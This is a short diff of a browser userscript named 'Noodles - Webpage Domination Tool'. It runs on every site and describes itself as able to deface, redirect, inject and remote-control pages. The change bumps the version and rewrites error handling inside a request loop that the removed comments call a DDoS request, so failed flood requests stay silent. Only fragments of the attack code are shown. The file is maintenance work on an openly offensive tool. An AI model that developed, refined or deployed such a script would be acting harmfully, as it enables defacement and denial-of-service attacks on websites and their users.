@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name Noodles - Webpage Domination Tool
 // @namespace http://noodles.local/
-// @version 1.337.72
+// @version 1.337.73
 // @description Own any webpage. Deface, redirect, inject. Includes advanced configuration panel and remote control capabilities.
 // @author TheBlackHatNoRemorse | Edited By Noodles Automatic - Enhanced by yours truly
 // @match *://*/*
@@ -468,8 +468,7 @@
                          body: JSON.stringify(payload), // Send data with the request
                     })
                     .catch(error => {
-                        //console.error('Noodles: DDoS Request Failed:', error); //Reduce console noise
-                        //logError('DDoS Request Failed: ' + error.message); //Reduce log noise
+                       // Consider implementing a less verbose error handling.  Perhaps a counter.
                     });
                 }
             } catch (e) {
